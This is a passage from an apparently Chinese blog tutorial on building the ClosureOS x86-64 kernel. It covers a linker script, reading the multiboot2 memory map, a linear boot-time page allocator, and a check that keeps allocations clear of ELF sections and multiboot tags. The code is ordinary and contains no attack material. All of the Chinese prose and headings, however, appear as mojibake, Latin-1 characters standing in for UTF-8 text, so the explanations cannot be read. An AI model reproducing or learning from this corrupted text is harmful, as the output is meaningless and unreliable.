class="hljs-keyword">boot</span>/libBoot.a(.rodata)<br>&#125;<br><br>. = ALIGN(4096);<br><br>.<span class="hljs-keyword">boot</span>.data ALIGN(4096) :<br>&#123;<br><span class="hljs-keyword">arch</span>/x86/<span class="hljs-keyword">boot</span>/libBoot.a(.data)<br><span class="hljs-keyword">arch</span>/x86/<span class="hljs-keyword">boot</span>/libBoot.a(.*)<br>&#125;<br><br>. = ALIGN(4096);<br><br>__boot_end = .;<br><br><span class="hljs-comment">/* now we come to the REAL kernel */</span><br><br>KERN_ELF_BASE = 0xFFFFFF8000000000;<br>. = KERN_ELF_BASE;<br>__kernel_start = .;<br><br><span class="hljs-comment">/* we use AT() there to make it loaded on phys correctly */</span><br><br>KERN_TEXT_BASE = KERN_ELF_BASE;<br>. = KERN_TEXT_BASE;<br>__kernel_text_base = .;<br><br>.text ALIGN(4096) : AT (__kernel_text_base - __kernel_start + __boot_end)<br>&#123;<br><span class="hljs-comment">*(.text)</span><br><span class="hljs-comment">*(.text.*)</span><br><span class="hljs-comment">*(.ltext)</span><br><span class="hljs-comment">*(.ltext.*)</span><br>&#125;<br><br>. = ALIGN(4096);<br><br>__kernel_text_end = .;<br>__kernel_text_sz = __kernel_text_end - __kernel_text_base;<br><br>KERN_DATA_BASE = 0xFFFFFF8010000000;<br>. = KERN_DATA_BASE;<br>__kernel_data_base = .;<br><br>.data ALIGN(4096) : AT (__kernel_text_sz + __boot_end)<br>&#123;<br><span class="hljs-comment">*(.data)</span><br><span class="hljs-comment">*(.ldata)</span><br><br><span class="hljs-comment">/* we have to set these arraies aligned to 8 bytes */</span><br>. = ALIGN(8);<br><br>__init_array = .;<br><span class="hljs-comment">*(.init_array)</span><br>__init_array_end = .;<br>__fini_array = .;<br><span class="hljs-comment">*(.fini_array)</span><br>&#125;<br><br>. = ALIGN(4096);<br><br>__kernel_data_end = .;<br>__kernel_data_sz = __kernel_data_end - __kernel_data_base;<br><br>KERN_RODATA_BASE = 0xFFFFFF8020000000;<br>. = KERN_RODATA_BASE;<br>__kernel_rodata_base = .;<br><br>.rodata ALIGN(4096) : AT (__kernel_data_sz + __kernel_text_sz + __boot_end)<br>&#123;<br><span class="hljs-comment">*(.rodata)</span><br><span class="hljs-comment">*(.rodata.*)</span><br>&#125;<br><br>. = ALIGN(4096);<br><br>__kernel_rodata_end = .;<br>__kernel_rodata_sz = __kernel_rodata_end - __kernel_rodata_base;<br><br>KERN_BSS_BASE = 0xFFFFFF8030000000;<br>. = KERN_BSS_BASE;<br>__kernel_bss_base = .;<br><br>.bss ALIGN(4096) : AT (__kernel_rodata_sz + __kernel_data_sz + __kernel_text_sz + __boot_end)<br>&#123;<br><span class="hljs-comment">*(COMMON)</span><br><span class="hljs-comment">*(.bss)</span><br><span class="hljs-comment">*(.lbss)</span><br>&#125;<br><br>. = ALIGN(4096);<br><br>__kernel_bss_end = .;<br>__kernel_bss_sz = __kernel_bss_end - __kernel_bss_base;<br><br>. = ALIGN(4096);<br><br>__kernel_end = .;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x01-å†…å­˜æ¢æµ‹ï¼Œä¸´æ—¶å†…å­˜åˆ†é…å™¨ï¼Œé¡µè¡¨é‡å»º"><a href="#0x01-å†…å­˜æ¢æµ‹ï¼Œä¸´æ—¶å†…å­˜åˆ†é…å™¨ï¼Œé¡µè¡¨é‡å»º" class="headerlink" title="0x01. å†…å­˜æ¢æµ‹ï¼Œä¸´æ—¶å†…å­˜åˆ†é…å™¨ï¼Œé¡µè¡¨é‡å»º"></a>0x01. å†…å­˜æ¢æµ‹ï¼Œä¸´æ—¶å†…å­˜åˆ†é…å™¨ï¼Œé¡µè¡¨é‡å»º</h1><h2 id="å†…å­˜å®¹é‡è·å–ä¸çº¿æ€§å†…å­˜åˆ†é…å™¨"><a href="#å†…å­˜å®¹é‡è·å–ä¸çº¿æ€§å†…å­˜åˆ†é…å™¨" class="headerlink" title="å†…å­˜å®¹é‡è·å–ä¸çº¿æ€§å†…å­˜åˆ†é…å™¨"></a>å†…å­˜å®¹é‡è·å–ä¸çº¿æ€§å†…å­˜åˆ†é…å™¨</h2><p>åœ¨åˆå§‹åŒ–å†…å­˜ç®¡ç†å™¨ä¹‹å‰ï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“å½“å‰ç©¶ç«Ÿæœ‰å¤šå°‘å†…å­˜ï¼Œç†Ÿæ‚‰ BIOS ä¸‹ OS å¼€å‘çš„åŒå­¦è‚¯å®šå¯¹BIOS <code>0x15</code> ä¸­æ–­çš„ <code>0xE820</code> ã€<code>0xE801</code> ã€<code>0x88</code> è¿™ä¸‰æ¿æ–§å†ç†Ÿæ‚‰ä¸è¿‡äº†ï¼Œç„¶è€Œåœ¨ UEFI å¯åŠ¨ä¸­æˆ‘ä»¬æ˜¯æ— æ³•ä½¿ç”¨ legacy BIOS çš„ä¸­æ–­è¿›è¡Œå†…å­˜æ¢æµ‹çš„</p><p>ä¸‡å¹¸çš„æ˜¯åœ¨ UEFI ä¸­åŒæ ·æœ‰ç±»ä¼¼çš„æ¥å£ä¾›æˆ‘ä»¬è·å–å†…å­˜å®¹é‡â€”â€”<a href="https://uefi.org/htmlspecs/ACPI_Spec_6_4_html/15_System_Address_Map_Interfaces/uefi-getmemorymap-boot-services-function.html">UEFI GetMemoryMap()</a>ï¼Œä¸è¿‡åœ¨æˆ‘ä»¬çš„ç³»ç»Ÿå½“ä¸­ï¼Œé€šè¿‡è¯¥æ¥å£è·å–å†…å­˜å®¹é‡çš„ä»»åŠ¡æ˜¯ç”± EFI ç¨‹åº Grub å®Œæˆçš„â€”â€” <strong>å¾—ç›Šäº multiboot2 è§„èŒƒçš„å­˜åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä» multiboot2 header ä¸­è·å–åˆ°å†…å­˜å®¹é‡</strong> </p><p><a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html#Boot-information-format">multiboot2 è§„èŒƒ</a>ä¸­ Memory Map æ®µçš„ tag æ ¼å¼å¦‚ä¸‹ï¼Œå…¶ä¸­ <code>size</code> ä¸º tag header åŠ ä¸Š æ‰€æœ‰ entry çš„å¤§å°ï¼Œ <code>entry_size</code> ä¸ºå•æ¡ entry çš„å¤§å°ï¼š</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">        +-------------------+<br>u32     |<span class="hljs-string"> type = 6          </span>|<br>u32     |<span class="hljs-string"> size              </span>|<br>u32     |<span class="hljs-string"> entry_size        </span>|<br>u32     |<span class="hljs-string"> entry_version     </span>|<br>varies  |<span class="hljs-string"> entries           </span>|<br>        +-------------------+<br></code></pre></td></tr></table></figure><p>æ¯ä¸ª entry çš„æ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">        +-------------------+<br>u64     |<span class="hljs-string"> base_addr         </span>|<br>u64     |<span class="hljs-string"> length            </span>|<br>u32     |<span class="hljs-string"> type              </span>|<br>u32     |<span class="hljs-string"> reserved          </span>|<br>        +-------------------+<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ç®€å•å†™ä¸€ä¸ªç¤ºä¾‹å‡½æ•°ï¼ˆéæ­£å¼ä»£ç ï¼‰è¿›è¡Œæµ‹è¯•ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">boot_mm_test</span><span class="hljs-params">(<span class="hljs-type">multiboot_uint8_t</span> *mbi)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">multiboot_tag</span> *tag;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">multiboot_tag_mmap</span> *mmap_tag = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">int</span> mmap_entry_nr;<br><br>    <span class="hljs-keyword">for</span> (tag = (<span class="hljs-keyword">struct</span> multiboot_tag *) (mbi + <span class="hljs-number">8</span>);<br>         tag-&gt;type != MULTIBOOT_TAG_TYPE_END;<br>         tag = (<span class="hljs-keyword">struct</span> multiboot_tag *)<br>                 ((<span class="hljs-type">multiboot_uint8_t</span> *) tag + ((tag-&gt;size + <span class="hljs-number">7</span>) &amp; ~<span class="hljs-number">7</span>))) &#123;<br>        <span class="hljs-keyword">if</span> (tag-&gt;type == MULTIBOOT_TAG_TYPE_MMAP) &#123;<br>            mmap_tag = (<span class="hljs-keyword">struct</span> multiboot_tag_mmap*) tag;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!mmap_tag) &#123;<br>        <span class="hljs-built_in">boot_puts</span>(<span class="hljs-string">&quot;[x] Unable to find mmap tag in multiboot info! Halting...&quot;</span>);<br>        <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span> <span class="hljs-params">(<span class="hljs-string">&quot; hlt; &quot;</span>)</span></span>;<br>    &#125;<br><br>    mmap_entry_nr = (mmap_tag-&gt;size - <span class="hljs-built_in">sizeof</span>(*mmap_tag)) / <span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> multiboot_mmap_entry);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; mmap_entry_nr; i++) &#123;<br>        <span class="hljs-built_in">boot_printstr</span>(<span class="hljs-string">&quot;[*] Memory region &quot;</span>);<br>        <span class="hljs-built_in">boot_printnum</span>(i);<br>        <span class="hljs-built_in">boot_printstr</span>(<span class="hljs-string">&quot;, addr: 0x&quot;</span>);<br>        <span class="hljs-built_in">boot_printhex</span>(mmap_tag-&gt;entries[i].addr);<br>        <span class="hljs-built_in">boot_printstr</span>(<span class="hljs-string">&quot;, size: 0x&quot;</span>);<br>        <span class="hljs-built_in">boot_printhex</span>(mmap_tag-&gt;entries[i].len);<br>        <span class="hljs-built_in">boot_printstr</span>(<span class="hljs-string">&quot;, type: &quot;</span>);<br>        <span class="hljs-built_in">boot_printnum</span>(mmap_tag-&gt;entries[i].type);<br>        <span class="hljs-built_in">boot_putchar</span>(<span class="hljs-string">&#x27;\n&#x27;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æœ‰ä¸å°‘å†…å­˜æ®µï¼Œä½†å…¶ä¸­ç»å¤§éƒ¨åˆ†éƒ½æ˜¯ä¸å¯ä½œä¸ºå†…å­˜ä½¿ç”¨çš„ä¿ç•™æ®µï¼ˆ<code>type ==2</code>ï¼‰ï¼Œæˆ‘ä»¬èƒ½ç”¨æ¥ä½œä¸ºå†…å­˜ä½¿ç”¨çš„åªæœ‰ <code>type==1</code> çš„æ®µï¼š</p><blockquote><p>è¿™äº›ä¿ç•™æ®µåŒ…æ‹¬ MMIO åŒºåŸŸç­‰</p></blockquote><p><img src="https://s2.loli.net/2024/06/16/PogROmLe2KjQwi3.png"></p><p>ç°åœ¨è®©æˆ‘ä»¬æ­£å¼å¼€å§‹ç¼–å†™ä¸å†…å­˜ç®¡ç†ç›¸å…³çš„ä»£ç ï¼Œç±»ä¼¼äºå†…æ ¸éœ€è¦åˆ†æ­¥è£…è½½ï¼ˆboot loader åˆ° kernelï¼‰ï¼Œæˆ‘ä»¬çš„å†…å­˜ç®¡ç†å™¨åŒæ ·é‡‡ç”¨ <strong>åˆ†æ­¥èµ°</strong> çš„è®¾è®¡æ€è·¯ï¼š</p><ul><li>å…ˆåˆ›å»ºä¸€ä¸ªæœ€åŸºæœ¬çš„å†…å­˜ç®¡ç†å™¨ï¼Œç”±å…¶åˆ†é…æ­£å¼çš„å†…å­˜ç®¡ç†å™¨æ‰€éœ€çš„å†…å­˜ï¼Œå†å¯ç”¨æ­£å¼çš„å†…å­˜ç®¡ç†å™¨</li></ul><p>è¿™ä¸ªå†…å­˜åˆ†é…å™¨çš„ä½œç”¨ <strong>ä»…</strong> æ˜¯ä¸ºæˆ‘ä»¬æ¥ä¸‹æ¥åˆ›å»ºæ­£å¼çš„å†…å­˜ç®¡ç†å™¨è¿›è¡Œå†…å­˜åˆ†é…ï¼Œå› æ­¤æˆ‘ä»¬ <strong>ä¸éœ€è¦è€ƒè™‘é‡Šæ”¾å†…å­˜çš„æƒ…å†µï¼Œç›´æ¥çº¿æ€§åœ°åˆ†é…å¯ç”¨å†…å­˜ç©ºé—´å³å¯</strong> ï¼Œä¸ºäº†ç®€åŒ–æ­¤é˜¶æ®µçš„å†…å­˜åˆ†é…æ¨¡å‹ï¼Œè¿™é‡Œæˆ‘ä»¬é™å®šæ¯æ¬¡åˆ†é…çš„å†…å­˜å¤§å°ä¸ºå•å¼ å†…å­˜é¡µï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">multiboot_tag_mmap</span> *mmap_tag = <span class="hljs-literal">nullptr</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> mmap_entry_nr;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">multiboot_mmap_entry</span> *curr_entry = <span class="hljs-literal">nullptr</span>;<br><span class="hljs-type">int</span> curr_entry_idx = <span class="hljs-number">-1</span>;<br>mm::<span class="hljs-type">phys_addr_t</span> curr_avail, curr_end;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Linear allocator without releasing, alloc a page each time.</span><br><span class="hljs-comment"> * Note that the result could be physical 0, NULL should not be use as failure,</span><br><span class="hljs-comment"> * but a -EMOMEM or some other error number should be returned.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">auto</span> <span class="hljs-title">boot_mm_page_alloc_internal</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span>*</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">void</span> *res;<br><br>    <span class="hljs-comment">/* initialization */</span><br>    <span class="hljs-keyword">if</span> (!curr_entry) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = (curr_entry_idx + <span class="hljs-number">1</span>); i &lt; mmap_entry_nr; i++) &#123;<br>            <span class="hljs-keyword">if</span> (mmap_tag-&gt;entries[i].type == MULTIBOOT_MEMORY_AVAILABLE) &#123;<br>                mm::<span class="hljs-type">phys_addr_t</span> base = mmap_tag-&gt;entries[i].addr;<br>                mm::<span class="hljs-type">phys_addr_t</span> end = base + mmap_tag-&gt;entries[i].len;<br><br>                <span class="hljs-keyword">if</span> (base &gt; end) &#123;<br>                    <span class="hljs-built_in">boot_puts</span>(<span class="hljs-string">&quot;[x] FATAL ERROR: &quot;</span><br>                              <span class="hljs-string">&quot;integeter overflow at parsing multiboot tags&quot;</span>);<br>                    <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span> <span class="hljs-params">(<span class="hljs-string">&quot; hlt; &quot;</span>)</span></span>;<br>                &#125;<br><br>                <span class="hljs-comment">/**</span><br><span class="hljs-comment">                 * we&#x27;d like to give up the first and last partial page,</span><br><span class="hljs-comment">                 * as it&#x27;s not enough for use to use</span><br><span class="hljs-comment">                */</span><br>                base = <span class="hljs-built_in">PAGE_ALIGN</span>(base);<br>                end &amp;= PAGE_MASK;<br>                <br>                <span class="hljs-comment">/* available region may be less than 1 page, ignore */</span><br>                <span class="hljs-keyword">if</span> ((end &lt; base) || ((end - base) &lt; PAGE_SIZE)) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br><br>                curr_avail = base;<br>                curr_end = end;<br>                curr_entry = &amp;mmap_tag-&gt;entries[i];<br>                curr_entry_idx = i;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!curr_entry) &#123;<br>        <span class="hljs-built_in">boot_puts</span>(<span class="hljs-string">&quot;[x] FATAL ERROR: NO MEMORY AVAILABLE!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">ERR_PTR</span>(-ENOMEM);<br>    &#125;<br><br>    res = (<span class="hljs-type">void</span>*) curr_avail;<br>    curr_avail += PAGE_SIZE;<br><br>    <span class="hljs-keyword">if</span> (curr_avail == curr_end) &#123;<br>        curr_entry = <span class="hljs-literal">nullptr</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œ <strong>æˆ‘ä»¬çš„å†…æ ¸æœ¬ä½“ä¾¿ä½äºå¯ç”¨å†…å­˜åŒºåŸŸ</strong> ï¼Œå› æ­¤åœ¨è¿›è¡Œå†…å­˜åˆ†é…æ—¶æˆ‘ä»¬åº”å½“è·³è¿‡è¿™äº›åŒºåŸŸï¼Œå¾—ç›Šäº Multiboot è§„èŒƒçš„å­˜åœ¨ï¼Œ boot loader ä¼šå‘æˆ‘ä»¬æä¾›ä¸€ä¸ªå¦‚ä¸‹æ ¼å¼çš„ tag æ¥å­˜æ”¾ ELF å„èŠ‚çš„ä¿¡æ¯ï¼š</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">        +-------------------+<br>u32     |<span class="hljs-string"> type = 9          </span>|<br>u32     |<span class="hljs-string"> size              </span>|<br>u16     |<span class="hljs-string"> num               </span>|<br>u16     |<span class="hljs-string"> entsize           </span>|<br>u16     |<span class="hljs-string"> shndx             </span>|<br>u16     |<span class="hljs-string"> reserved          </span>|<br>varies  |<span class="hljs-string"> section headers   </span>|<br>        +-------------------+<br></code></pre></td></tr></table></figure><p>ELF æ ¼å¼æ˜¯ *nix ç³»ç»Ÿä¸­å¸¸ç”¨çš„å¯æ‰§è¡Œç¨‹åºçš„æ ¼å¼ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬çš„ ClosureOS kernel æ–‡ä»¶çš„æ ¼å¼ï¼Œç®€å•ç†è§£å¯ä»¥è®¤ä¸ºå…¶ç”±ä¸€ä¸ª ELF header å­˜å‚¨æ€»çš„ä¿¡æ¯ï¼Œç”±ä¸€ä¸ª header table å­˜å‚¨ä¸åŒ section çš„ä¿¡æ¯ï¼Œç®€è€Œè¨€ä¹‹ä¸€ä¸ª ELF æ–‡ä»¶åº”å½“é•¿è¿™ä¸ªæ ·å­ï¼š</p><p><img src="https://i.loli.net/2021/06/03/boZ8nCURBOXfdQH.png" alt="ELF æ ¼å¼æä¾›äº†ä¸¤ç§åŸºæœ¬è§†å›¾ï¼šé“¾æ¥è§†å›¾ä¸æ‰§è¡Œè§†å›¾ï¼ŒåŒºåˆ«å¤§æ¦‚å°±æ˜¯é“¾æ¥åä¼šæŠŠç›¸åŒçš„æ®µæ•´åˆåœ¨ä¸€èµ·"></p><p>æ›´åŠ è¯¦ç»†çš„ç»†èŠ‚ç¬”è€…å°±ä¸èµ˜å™äº†ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥è‡ªè¡Œå‚è€ƒ <a href="https://refspecs.linuxfoundation.org/elf/elf.pdf">Linux Foundation - Executable and Linking Format (ELF) Specification</a> ï¼Œè¿™é‡Œæˆ‘ä»¬ç®€å•ä»‹ç»ä¸€ä¸‹ section header çš„æ ¼å¼ï¼Œmultiboot2 elf tag æä¾›ç»™æˆ‘ä»¬çš„ section headers å’Œ ELF ä¸­çš„ section header table æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯ä¸€ä¸ªå¦‚ä¸‹æ‰€ç¤ºç»“æ„ä½“çš„æ•°ç»„ï¼Œä¸åŒçš„æ˜¯ <code>sh_offset</code> æ®µè¢« GRUB å¡«ä¸Šå…¶ç›¸å¯¹äº ELF åŠ è½½èµ·å§‹åœ°å€çš„åç§»ï¼ˆåœ¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬åœ¨é“¾æ¥è„šæœ¬ä¸­å°†è¿™ä¸ªèµ·å§‹åœ°å€è®¾ä¸º <code>1M</code> ï¼‰ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">elf64_shdr</span> &#123;<br>    elf64_word  sh_name;<br>    elf64_word  sh_type;<br>    elf64_xword sh_flags;<br>    elf64_addr  sh_addr;<br>    elf64_off   sh_offset;<br>    elf64_xword sh_size;<br>    elf64_word  sh_link;<br>    elf64_word  sh_info;<br>    elf64_xword sh_addr_align;<br>    elf64_xword sh_ent_size;<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>è‡³äºä¸ºä»€ä¹ˆæ˜¯ section header è€Œä¸æ˜¯ program headerï¼Œæ€»ä¹‹ multiboot2 specification å°±æ˜¯è¿™ä¹ˆå®šä¹‰çš„â€¦</p></blockquote><p>è¿™é‡Œæˆ‘ä»¬ç®€å•å†™ä¸€ä¸ª wrapper åœ¨æ¯æ¬¡è¿›è¡Œå†…å­˜åˆ†é…ä¹‹åå°†åœ°å€ä¸ ELF tag ä¸­å„ section çš„åœ°å€èŒƒå›´è¿›è¡Œå¯¹æ¯”ï¼Œè‹¥åˆšå¥½ä½äº ELF èŒƒå›´åˆ™é‡æ–°è¿›è¡Œå†…å­˜åˆ†é…ï¼Œè¿™é‡Œæˆ‘ä»¬ä»…è€ƒè™‘ <code>shdr-&gt;sh_type == SHT_PROGBITS</code> çš„æƒ…å†µï¼Œå› ä¸º <code>.text</code> ç­‰æ®µéƒ½æ˜¯è¿™ä¸ªç±»å‹ï¼Œå…¶ä»–çš„ä¸€äº›ä¾‹å¦‚ <code>.symtab</code> ç­‰æ®µå¯¹äºæˆ‘ä»¬ç¨‹åºè¿è¡Œè€Œè¨€å…¶å®å¹¶ä¸é‡è¦ï¼›æ­¤å¤–æˆ‘ä»¬ä»…è€ƒè™‘ <code>shdr-&gt;sh_flags</code> åŒ…å« <code>SHF_ALLOC</code> çš„æƒ…å†µï¼Œåªæœ‰å­˜åœ¨è¯¥æ ‡å¿—ä½æ‰è¡¨ç¤ºè¿™ä¸ªæ®µåœ¨è¿è¡Œæ—¶éœ€è¦å†…å­˜</p><blockquote><p>è‡³äº <code>.bss</code> æ®µï¼Œæˆ‘ä»¬æ‰€è·å¾—çš„ç±»å‹ä¸º <code>shdr-&gt;sh_type == SHT_NOBITS</code> ï¼Œå› ä¸ºè¿™ä¸ªæ®µçš„æ•°æ®å…¨ä¸º 0ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥æš‚æ—¶å¿½ç•¥ï¼Œç­‰åˆ°åç»­é‡å»ºé«˜ç«¯å†…æ ¸å†…å­˜æ˜ å°„æ—¶å†åˆ†é…è¿™ä¸ªæ®µçš„ç©ºé—´</p></blockquote><p>æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜éœ€è¦é¿å…è¦†å†™æ‰ multiboot tags æ‰€åœ¨çš„åŒºåŸŸä»¥åŠ frame buffer æ‰€åœ¨åŒºåŸŸï¼š</p><blockquote><p>å®é™…ä¸Šï¼Œframe buffer çš„å†…å­˜åŒºåŸŸé€šå¸¸å¹¶ä¸ç›´æ¥æ¥è‡ª RAMï¼Œè€Œæ˜¯æ¥è‡ªæ˜¾å¡ï¼Œä¸è¿‡ä¿é™©èµ·è§è¿™é‡Œå¤šåŠ ä¸€ä»½æ£€æŸ¥</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">multiboot_tag_elf_sections</span> *elf_info_tag = <span class="hljs-literal">nullptr</span>;<br>mm::<span class="hljs-type">phys_addr_t</span> multiboot_tag_start, multiboot_tag_end;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">auto</span> <span class="hljs-title">addr_is_in_used_range</span><span class="hljs-params">(mm::<span class="hljs-type">phys_addr_t</span> addr)</span> -&gt; <span class="hljs-type">bool</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">elf64_shdr</span> *shdr;<br>    <span class="hljs-type">void</span> *shdr_end;<br>    mm::<span class="hljs-type">phys_addr_t</span> seg_start, seg_end;<br><br>    <span class="hljs-comment">/* in ELF range */</span><br>    shdr_end = (<span class="hljs-type">void</span>*) ((mm::<span class="hljs-type">phys_addr_t</span>) &amp;elf_info_tag-&gt;sections<br>               + elf_info_tag-&gt;num * <span class="hljs-built_in">sizeof</span>(*shdr));<br><br>    <span class="hljs-keyword">for</span> (shdr = (elf64_shdr*) &amp;elf_info_tag-&gt;sections;<br>         (<span class="hljs-type">void</span>*) shdr &lt; shdr_end;<br>         shdr = (elf64_shdr*) ((mm::<span class="hljs-type">phys_addr_t</span>) shdr + <span class="hljs-built_in">sizeof</span>(*shdr))) &#123;<br><br>        <span class="hljs-keyword">if</span> ((shdr-&gt;sh_type != SHT_PROGBITS)<br>            || !(shdr-&gt;sh_flags &amp; SHF_ALLOC)) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        seg_start = <span class="hljs-number">0x100000</span> + shdr-&gt;sh_offset;<br>        seg_end = <span class="hljs-built_in">PAGE_ALIGN</span>(seg_start + shdr-&gt;sh_size);<br><br>        <span class="hljs-keyword">if</span> (addr &gt;= seg_start &amp;&amp; addr &lt; seg_end) &#123;<br>            <span 